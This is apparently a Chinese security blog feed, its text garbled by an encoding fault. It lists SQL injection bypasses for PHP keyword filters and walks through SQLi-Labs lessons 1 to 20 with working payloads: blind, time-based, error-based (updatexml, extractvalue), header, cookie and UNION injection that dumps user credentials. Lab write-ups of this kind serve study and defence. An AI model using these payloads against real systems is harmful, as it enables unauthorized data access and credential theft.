(select*from(select user())a) å¾—åˆ°å­—ç¬¦ä¸² root@localhost

è¡¨è¾¾å¼â€™root@localhostâ€™è¢«è½¬æ¢ä¸º0ï¼ŒæŒ‰ä½å–è¡¥ä¹‹åå¾—åˆ°ä¸€ä¸ªéå¸¸çš„å¤§æ•°ï¼Œå®ƒæ˜¯MySQLä¸­æœ€å¤§çš„æ— ç¬¦å·æ•´æ•°
</code></pre><h2 id="é™„ï¼šPHPä¸­ä¸€äº›å¸¸è§çš„è¿‡æ»¤æ–¹æ³•åŠç»•è¿‡æ–¹å¼"><a href="#é™„ï¼šPHPä¸­ä¸€äº›å¸¸è§çš„è¿‡æ»¤æ–¹æ³•åŠç»•è¿‡æ–¹å¼" class="headerlink" title="é™„ï¼šPHPä¸­ä¸€äº›å¸¸è§çš„è¿‡æ»¤æ–¹æ³•åŠç»•è¿‡æ–¹å¼"></a>é™„ï¼šPHPä¸­ä¸€äº›å¸¸è§çš„è¿‡æ»¤æ–¹æ³•åŠç»•è¿‡æ–¹å¼</h2><pre><code>è¿‡æ»¤å…³é”®å­—    and or
phpä»£ç     preg_match(&apos;/(and|or)/i&apos;,$id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 or 1=1 1 and 1=1
ç»•è¿‡æ–¹å¼    1 || 1=1 1 &amp;&amp; 1=1

è¿‡æ»¤å…³é”®å­—    and or union
phpä»£ç     preg_match(&apos;/(and|or|union)/i&apos;,$id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     union select user,password from users
ç»•è¿‡æ–¹å¼    1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos;

è¿‡æ»¤å…³é”®å­—    and or union where
phpä»£ç     preg_match(&apos;/(and|or|union|where)/i&apos;,$id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;
ç»•è¿‡æ–¹å¼    1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;

è¿‡æ»¤å…³é”®å­—    and or union where
phpä»£ç     preg_match(&apos;/(and|or|union|where)/i&apos;,$id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;
ç»•è¿‡æ–¹å¼    1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;
ç»•è¿‡æ–¹å¼    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_idèšåˆä¸­user_idä¸º1çš„userä¸ºadmin

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit, group by
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;
ç»•è¿‡æ–¹å¼    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit, group by, select
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
ç»•è¿‡æ–¹å¼    1 &amp;&amp; substr(user,1,1) = &apos;a&apos;

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit, group by, select, &apos;
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1
ç»•è¿‡æ–¹å¼    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit, group by, select, &apos;, hex
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; substr(user,1,1) = unhex(61)
ç»•è¿‡æ–¹å¼    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #åè¿›åˆ¶çš„11è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¹¶å°å†™ã€‚

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit, group by, select, &apos;, hex, substr
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;
ç»•è¿‡æ–¹å¼    1 &amp;&amp; lpad(user,7,1)

è¿‡æ»¤å…³é”®å­—    and, or, union, where, limit, group by, select, &apos;, hex, substr, ç©ºæ ¼
phpä»£ç     preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 &amp;&amp; lpad(user,7,1)/td&gt;
ç»•è¿‡æ–¹å¼    1%0b||%0blpad(user,7,1)

è¿‡æ»¤å…³é”®å­—    and or union where
phpä»£ç     preg_match(&apos;/(and|or|union|where)/i&apos;,$id)
ä¼šè¿‡æ»¤çš„æ”»å‡»ä»£ç     1 || (select user from users where user_id = 1) = &apos;admin&apos;
ç»•è¿‡æ–¹å¼    1 || (select user from users limit 1) = &apos;admin&apos;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi-Labså­¦ä¹ ç¬”è®°]]></title>
      <url>/2016/07/29/SQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼Œä¹Ÿå«åšSQLï¼Œä»æ ¹æœ¬ä¸Šè¯´æ˜¯ä¸€ç§å¤„ç†æ•°æ®åº“çš„ç¼–ç¨‹è¯­è¨€ã€‚å¯¹äºåˆå­¦è€…ï¼Œæ•°æ®åº“ä»…ä»…æ˜¯åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚SQLé€šè¿‡ç»“æ„åŒ–æŸ¥è¯¢ï¼Œå…³ç³»ï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹ç­‰ç­‰æ¥ç®¡ç†æ•°æ®åº“ã€‚ç¼–ç¨‹æå®¢ä»¬æ€»æ˜¯æå‡ºè®¸å¤šè¿™æ ·ç±»å‹çš„è½¯ä»¶ï¼ŒåƒMySQLï¼ŒMS SQL ,Oracleä»¥åŠPostgresqlã€‚ç°åœ¨æœ‰ä¸€äº›ç¨‹åºèƒ½è®©æˆ‘ä»¬æœ‰èƒ½åŠ›é€šè¿‡ç»“æ„åŒ–æŸ¥è¯¢æ¥ç®¡ç†å¤§å‹æ•°æ®åº“ã€‚</p>
<a id="more"></a>
<p>æˆ‘ä»¬å°†è¦ä½¿ç”¨çš„å®éªŒå®¤æ˜¯SQLi Labsï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯ä»¥ä»<a href="https://github.com/Audi-1/sqli-labså…è´¹ä¸‹è½½ï¼Œä»¥ä¾¿æˆ‘ä»¬ç ”ç©¶å­¦ä¹ ä»¥åŠç¼–å†™å®‰å…¨çš„ç¨‹åºã€‚" target="_blank" rel="external">https://github.com/Audi-1/sqli-labså…è´¹ä¸‹è½½ï¼Œä»¥ä¾¿æˆ‘ä»¬ç ”ç©¶å­¦ä¹ ä»¥åŠç¼–å†™å®‰å…¨çš„ç¨‹åºã€‚</a></p>
<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€;</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°å¯¹äºç›´æ¥ GET è¿›æ¥çš„æ–‡æœ¬æ²¡æœ‰è¿‡æ»¤ã€‚<br>åŒæ—¶ï¼Œåœ¨æŸ¥è¯¢è¯­å¥ä¸­ï¼Œid=â€™$idâ€™ï¼Œå˜é‡åŠ äº†å¼•å·ã€‚è¿™é‡Œå¼•å·çš„æ„æ€æ˜¯æŠŠè¾“å…¥çš„ id å½“åšå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œå–ä»å¤´å¼€å§‹çš„æœ€é•¿æ•°å­—ä¸”ç±»å‹è½¬æ¢ä¸ºæ•´å½¢è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<pre><code>?id=12a             æ˜¾ç¤ºidä¸º12çš„ç”¨æˆ·
?id=1a2a            æ˜¾ç¤ºidä¸º1çš„ç”¨æˆ·
?id=102a            æ˜¾ç¤ºidä¸º102çš„ç”¨æˆ·ï¼ˆä¸å­˜åœ¨ï¼‰
ç›²æ³¨
?id=1%27and+left(version(),1)=5%23                å¾—å‡ºæ•°æ®åº“ç‰ˆæœ¬ä¸º5å¼€å¤´
?id=1%27and+length(database())=8%23               æ•°æ®åº“åé•¿åº¦ä¸º8
?id=1%27and+left(database(),8)=&apos;security&apos;%23      æ•°æ®åº“ä¸ºsecurity
?id=1%27and+length(username)=4%23                 ç”¨æˆ·åé•¿åº¦ä¸º4
?id=1%27and+left(username,4)=&apos;Dumb&apos;%23            ç”¨æˆ·åä¸ºDumb
?id=1%27and+length(password)=4%23                 å¯†ç é•¿åº¦ä¸º4
?id=1%27and+left(password,4)=&apos;Dumb&apos;%23            å¯†ç ä¸ºDumb
</code></pre><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=$id LIMIT 0,1â€;</p>
</blockquote>
<p>åŒæ ·æœªåšè¿‡æ»¤ï¼Œä½†æ­¤å¤„çš„å˜é‡ id æ— å¼•å·ã€‚å¤§æ¦‚æ˜¯ç›´æ¥å°†å˜é‡ id å½“åšæ•´å½¢ä¼ å…¥æŸ¥è¯¢ã€‚</p>
<pre><code>?id=12  æ˜¾ç¤º id ä¸º 12 çš„ç”¨æˆ·
?id=12a æŠ¥é”™ï¼šUnknown column &apos;12a&apos; in &apos;where clause&apos;
?id=%31 æ˜¾ç¤º id ä¸º 1 çš„ç”¨æˆ·
æ³¨å…¥æµ‹è¯•ï¼š
?id=1+and+left(version(),1)=5 ç›´æ¥æ³¨å…¥å³å¯å¾—åˆ°ç‰ˆæœ¬å·
</code></pre><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=(â€˜$idâ€™) LIMIT 0,1â€;</p>
</blockquote>
<p>æœªè¿‡æ»¤ï¼Œä½†å˜é‡ id åŠ äº†å¼•å·å’Œæ‹¬å·ã€‚å°†å˜é‡ id ä»¥å­—ç¬¦ä¸²å½¢å¼å¼•å…¥ï¼Œå’ŒLess-1å¾ˆåƒï¼Œä½†æ˜¯å´åˆå¤šäº†ä¸ªæ‹¬å·ï¼ŒçŒœæµ‹æ˜¯é˜²æ­¢æ³¨å…¥è¯­å¥ã€‚</p>
<pre><code>æ³¨å…¥æµ‹è¯•ï¼š
?id=12+and+1=1           æ˜¾ç¤ºæ­£ç¡®
?id=12+an                ä¸å®Œå…¨è¯­å¥ä¹Ÿæ˜¾ç¤ºæ­£ç¡®
çŒœæµ‹ï¼šæ‹¬å·å°†å˜é‡é™åˆ¶åœ¨æ‹¬å·èŒƒå›´å†…ï¼Œå°è¯•æ‰‹åŠ¨æå‰åŒ¹é…æ‹¬å·æ³¨å…¥ã€‚
?id=12%27                        æˆåŠŸæŠ¥é”™ï¼š&apos;&apos;12&apos;&apos;) LIMIT 0,1&apos; at line 1
?id=1%27%29and+1=2%23                                æ— æ˜¾ç¤ºï¼Œå¯æ³¨å…¥
ä¸Šé¢é‚£æ¡è¯­å¥è¿˜åŸåˆ° SQL è¯­å¥æ—¶ï¼Œä¸ºï¼š
SELECT * FORM users WHERE id=(&apos;1&apos;)and 1=2#&apos;) LIMIT 0,1
</code></pre><p>å°†æ‹¬å·æå‰ç»“æŸä¸”ç”¨ #å·æ³¨é‡Šæ‰æ¥ä¸‹æ¥çš„è¯­å¥ã€‚æ¥ä¸‹æ¥çš„æ³¨å…¥åªè¦æ›¿æ¢ and 1=1 è¯­å¥å°±è¡Œäº†ã€‚</p>
<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$id = â€˜â€œâ€˜ . $id . â€˜â€œâ€˜;</p>
<p>$sql=â€SELECT * FROM users WHERE id=($id) LIMIT 0,1â€;</p>
</blockquote>
<p>å¯¹å˜é‡ id åšäº†å¤„ç†ã€‚è¯¥å¤„ç†åœ¨ id å‰åæ·»åŠ åŒå¼•å·ã€‚</p>
<pre><code>?id=1%22%29+and+1=2%23            æ— æ˜¾ç¤ºï¼Œå¯æ³¨å…¥
SELECT * FROM users WHERE id=(&quot;1&quot;)and 1=2#&quot;) LIMIT 0,1
</code></pre><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€;</p>
</blockquote>
<pre><code>?id=1&apos;and+1=2#
</code></pre><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$id = â€˜â€œâ€˜.$id.â€™â€â€˜;</p>
<p>$sql=â€SELECT * FROM users WHERE id=$id LIMIT 0,1â€;</p>
</blockquote>
<pre><code>?id=1&quot;and+1=2#
</code></pre><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=((â€˜$idâ€™)) LIMIT 0,1â€;</p>
</blockquote>
<pre><code>?id=1&apos;))and 1=2#
</code></pre><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>å…³é”®ä»£ç ï¼š</p>
<blockquote>
<p>$sql=â€SELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€;</p>
</blockquote>
<pre><code>?id=1&apos; and 1=2#
</code></pre><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>å°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œå„ç§ç»„åˆï¼Œä½†æ˜¯æœåŠ¡å™¨è¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·ã€‚<br>å°è¯• ?id=10000000000<br>è¿”å›ç»“æœä¹Ÿæ˜¯æ­£ç¡®ï¼Œå› ä¸ºä¸å­˜åœ¨è¿™ä¹ˆå¤§çš„ idï¼Œæ‰€ä»¥åˆ¤æ–­è¿™ä¸ªé¡µé¢æŠŠæ­£ç¡®å’Œé”™è¯¯çš„ä¿¡æ¯å…¨éƒ¨è¿”å›ä¸€è‡´ã€‚<br>äºæ˜¯ï¼Œä½¿ç”¨åŸºäºæ—¶é—´çš„æ³¨å…¥ï¼Œæ„é€ ä»¥ä¸‹è¯­å¥ï¼š</p>
<pre><code>?id=1&apos; and sleep(5) %23
</code></pre><p>å¦‚æœé”™è¯¯ï¼Œåˆ™æœåŠ¡å™¨å¤„ç†5ç§’å†è¿”å›ï¼Œå¦åˆ™ç›´æ¥è¿”å›ï¼Œæ‰¾åˆ°æ­£ç¡®çš„æ³¨å…¥ç‚¹ã€‚</p>
<pre><code>?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23

?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23

ç¬¬ä¸€ä¸ªè¯­å¥æš‚åœäº”ç§’ç¬¬äºŒä¸ªç›´æ¥è¿”å›ï¼Œåˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºsï¼ˆasciiä¸º115ï¼‰
</code></pre><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>åˆæ˜¯ä¸€ä¸ªåŸºäºæ—¶é—´çš„æ³¨å…¥ï¼Œå°è¯•äº†ä¸‹ï¼Œæ³¨å…¥ç‚¹åœ¨è¿™ï¼š</p>
<pre><code>?id=1&quot; and sleep(5) %23
</code></pre><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>è¿™ä¸ªé¡µé¢é‡‡ç”¨ POST çš„æ–¹æ³•å¾—åˆ°æ•°æ®ã€‚äºæ˜¯ç”¨ HackBar ä¿®æ”¹ post æ•°æ®è¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code>uname=admin&amp;passwd=123&apos;
æ˜¾ç¤ºï¼š
 &apos;&apos;123&apos;&apos; LIMIT 0,1&apos; 
å»æ‰å•å¼•å·
&apos;123&apos;&apos; LIMIT 0,1
å†å»æ‰å¯†ç çš„å•å¼•å·
123&apos; LIMIT 0,1
</code></pre><p>æ‰€ä»¥ç¡®å®šæ˜¯å•å¼•å·æ³¨å…¥ï¼Œç›´æ¥ä¸‡èƒ½å¯†é’¥è¯•è¯•ï¼š</p>
<pre><code>uname=admin&apos; or &apos;1&apos;=&apos;1 &amp;passwd=123456
</code></pre><p>è¿™é‡Œçš„è¯æœ‰ä¸ªç‚¹ï¼š</p>
<p>å¦‚æœè¾“å…¥ï¼šuname=adminâ€™ or â€˜1â€™=â€™1 &amp;passwd=123456ï¼Œä¼šæ˜¾ç¤ºå¤±è´¥ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>é¦–å…ˆandçš„ä¼˜å…ˆçº§é«˜äºor  ã€å°±æ˜¯andå…ˆè¿ç®—ã€‘</p>
<p>é‚£ä¹ˆâ€™1â€™=â€™1â€™ and password=â€™123456â€™å…ˆè¿ç®—ï¼Œå› ä¸ºusersè¡¨é‡Œé¢çš„passwordå­—æ®µæ²¡æœ‰ä¸€ä¸ªæ•°æ®æ—¶testï¼Œå³è¾¹æ˜¯falseï¼Œé‚£ä¹ˆæ•´ä¸ªè¡¨è¾¾å¼å°±æ˜¯false</p>
<p>è¿™ä¸ªæ—¶å€™æ•´ä¸ªçš„è¯­å¥å°±æ˜¯ï¼š</p>
<pre><code>SELECT username, password FROM users WHERE username=&apos;test&apos; or false LIMIT 0,1
</code></pre><p>æ•°æ®åº“é‡Œæ²¡æœ‰testç”¨æˆ·ï¼Œæ‰€ä»¥å°±å¤±è´¥äº†ã€‚</p>
<p>è€Œä¸‡èƒ½å¯†é’¥çš„è¯­å¥æ˜¯ï¼š</p>
<pre><code>SELECT username, password FROM users WHERE username=&apos;admin&apos; or false LIMIT 0,1
</code></pre><p>å¯¹äºä¸Šè¿°çš„æƒ…å†µï¼Œæˆ‘ä»¬åœ¨å¯†ç å­—æ®µåŠ å…¥å³å¯</p>
<pre><code>uname=test&amp;passwd=123456&apos; or &apos;1&apos;=&apos;1

SELECT username, password FROM users WHERE username=&apos;test&apos; or true LIMIT 0,1
</code></pre><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>å…ˆå°è¯•å•å¼•å·ï¼ŒåŒå¼•å·ã€‚</p>
<p>è¾“å…¥ï¼š</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€</p>
</blockquote>
<p>æŠ¥é”™ï¼š</p>
<blockquote>
<p>â€˜â€œ123456â€â€) LIMIT 0,1â€™</p>
<p>123456â€) LIMIT 0,1</p>
</blockquote>
<p>æ„é€ POCï¼š</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€) or â€œ1â€=â€1â€#</p>
</blockquote>
<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>å…ˆå°è¯•å•å¼•å·ï¼ŒåŒå¼•å·ã€‚</p>
<p>è¾“å…¥ï¼š</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€™</p>
</blockquote>
<p>æŠ¥é”™ï¼š</p>
<blockquote>
<p>â€˜â€™123456â€™â€™) LIMIT 0,1â€™ </p>
<p>123456â€™) LIMIT 0,1</p>
</blockquote>
<p>æ„é€ POCï¼š</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€™) or (â€˜1â€™)=(â€˜1</p>
<p>æˆ–è€…</p>
<p>uname=test&amp;passwd=123456â€™) or â€œ1â€=â€1â€#</p>
</blockquote>
<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>å…ˆå°è¯•å•å¼•å·ï¼ŒåŒå¼•å·ã€‚</p>
<p>è¾“å…¥ï¼š</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€</p>
</blockquote>
<p>æŠ¥é”™ï¼š</p>
<blockquote>
<p>â€˜â€œ123456â€â€ LIMIT 0,1â€™ </p>
<p>123456â€ LIMIT 0,1</p>
</blockquote>
<p>æ„é€ POCï¼š</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€ or â€œ1â€=â€1â€#</p>
<p>æˆ–è€…</p>
<p>uname=test&amp;passwd=123456â€ or â€œ1â€=â€1</p>
</blockquote>
<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>è¿™é‡Œè¾“å…¥å•å¼•å·ï¼ŒåŒå¼•å·å°±ä¸ä¼šæŠ¥é”™äº†ï¼Œæˆ‘ä»¬åªèƒ½åŠ ä¸Šæ°¸çœŸæ°¸å‡æˆ–è€…æ—¶é—´å»¶è¿Ÿå‡½æ•°äº†ã€‚</p>
<p>æµ‹è¯•å‘ç°æ—¶é—´å»¶è¿Ÿä¸è¡Œã€‚</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€™ or 1=1#</p>
</blockquote>
<p>ç›´æ¥æˆåŠŸäº†ï¼Œ</p>
<p>è¯•ä¸€ä¸‹ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥å¾—ã€‚</p>
<blockquote>
<p>uname=test&amp;passwd=123456â€™ or length(database())=8#</p>
</blockquote>
<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><blockquote>
<p>uname=test&amp;passwd=123456â€) or 1=1#</p>
</blockquote>
<p>æˆåŠŸç™»é™†ï¼Œæ—¶é—´å»¶è¿Ÿæ³¨å…¥è¯•è¯•</p>
<pre><code>uname=test&amp;passwd=123456&quot;)  or if(length(database())=7,1,sleep(5)) #
æš‚åœï¼Œè¯´æ˜ä¸å¯¹
uname=test&amp;passwd=123456&quot;)  or if(length(database())=8,1,sleep(5)) #
æˆåŠŸç™»é™†
</code></pre><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><pre><code>uname=admin&amp;passwd=123456&apos; where username=&apos;admin&apos; and 1=2 #
å¯¹åº”çš„SQLè¯­å¥æ˜¯ï¼š
UPDATE users SET password = &apos;123456&apos; where username=&apos;admin&apos; and 1=2 #&apos; WHERE username=&apos;admin&apos;
</code></pre><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>è¿™æ˜¯ Header æ³¨å…¥ã€‚</p>
<p>æ„æ€æ˜¯ï¼Œä»æœåŠ¡å™¨è¦æ±‚çš„ Header å¤´é‡Œé¢æ‰¾åˆ°å¯ä»¥æ³¨å…¥çš„æ³¨å…¥ç‚¹ã€‚</p>
<p>ä»æºä»£ç å¯ä»¥çœ‹å‡ºï¼ŒæœåŠ¡å™¨å°† Header é‡Œé¢çš„ user-agent çš„å€¼æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±å¸¦å…¥äº† insert into è¯­å¥ï¼Œè¿™å°±é€ æˆäº†æ³¨å…¥ã€‚</p>
<pre><code>$uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;];
...
$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
</code></pre><p>é¦–å…ˆï¼ŒæŠ“åŒ…ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œinsert into è¯­å¥è¦åœ¨ç™»é™†æˆåŠŸåæ‰èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥å¿…é¡»è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·å’Œå¯†ç å†æŠ“åŒ…ã€‚</p>
<pre><code>xpathæ³¨å…¥ï¼š
payloadï¼šupdatexml(1,concat(0x7e,(version())),0)
ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ ç›®æ ‡xml
ç¬¬äºŒä¸ªå‚æ•°æ˜¯ xpathçš„è¡¨è¾¾å¼ï¼Œè¿™ä¸ªçœ‹w3cé‚£ä¸ªxpathæ•™ç¨‹
ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ è¦å°†xpathçš„è¡¨è¾¾å¼çš„ä¸œè¥¿å°†ç›®æ ‡xmlæ›¿æ¢æˆä»€ä¹ˆ
</code></pre><p>POC:</p>
<pre><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;,&quot;)#
å“åº”ï¼š
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)#
XPATH syntax error: &apos;:5.5.47&apos;

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)#
å“åº”ï¼š
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)
XPATH syntax error: &apos;:Dumb&apos;
</code></pre><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>POC:</p>
<pre><code>Referer: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)#
å“åº”ï¼š
Your Referer is: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)
XPATH syntax error: &apos;:5.5.47&apos;
</code></pre><p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªæŠ¥é”™å‡½æ•°extractvalue</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿæ˜¯ä¸ªxmlï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯xpathçš„è¡¨è¾¾å¼ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯è·å–xmlä¸­æŸä¸ªèŠ‚ç‚¹çš„å€¼</p>
<p>ä¸updatexmlä¸€æ¬¡åªèƒ½æ›´æ–°ä¸€ä¸ªèŠ‚ç‚¹ä¸åŒï¼Œextractvalueå¯ä»¥ä¸€æ¬¡è·å–å¤šä¸ªèŠ‚ç‚¹çš„å€¼ï¼Œå¹¶ä»¥ç©ºæ ¼åˆ†éš”</p>
<p>POC:</p>
<pre><code>Referer: 1&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)#
å“åº”ï¼š
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)#
XPATH syntax error: &apos;:5.5.47&apos;
</code></pre><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>è¿™é¢˜ç”¨ Cookies æ³¨å…¥</p>
<p>POC:</p>
<pre><code>Cookie: uname=admin&apos;;
æŠ¥é”™
Cookie: uname=admin&apos; order by 3#;
æ­£å¸¸æ˜¾ç¤º
Cookie: uname=admin&apos; order by 4#;
æŠ¥é”™ï¼Œæ‰€ä»¥æ˜¯ä¸‰ä¸ªå­—æ®µ
Cookie: uname=admin&apos; and 1=2 union select 1,2,3#;
æ˜¾ç¤º2ï¼Œ3
Cookie: uname=admin&apos; and 1=2 union select 1,database(),version()#;
æ•°æ®åº“ï¼šsecurity,ç‰ˆæœ¬ï¼š5.5.47
Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(table_nameï¼‰ from information_schema.tables where table_schema=database()#;
è¡¨åï¼šemails,referers,uagents,usersï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç”¨limitè¯­å¥
Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#;
å­—æ®µï¼šuser_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password
Cookie: uname=admin&apos; and 1=2 union select 1,username,password from users limit 0,1#;
